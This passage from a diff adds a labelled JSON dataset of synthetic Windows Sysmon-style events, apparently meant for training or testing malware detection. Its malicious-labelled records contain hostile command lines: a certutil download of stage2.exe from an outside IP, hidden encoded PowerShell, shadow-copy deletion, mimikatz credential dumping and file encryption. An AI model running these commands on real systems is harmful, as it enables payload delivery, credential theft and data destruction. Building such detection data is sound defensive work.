+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\Temp\\mimikatz.exe",
+    "CommandLine": "mimikatz sekurlsa::logonpasswords exit",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Hashes": "MD5=DEADBEEF",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 7,
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "ImageLoaded": "C:\\Users\\Temp\\evil.dll",
+    "Signed": false,
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Users\\Public\\loader.exe",
+    "DestinationIp": "185.220.101.45",
+    "DestinationPort": 4444,
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\Temp\\mimikatz.exe",
+    "CommandLine": "mimikatz sekurlsa::logonpasswords exit",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Hashes": "MD5=DEADBEEF",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  }
+]
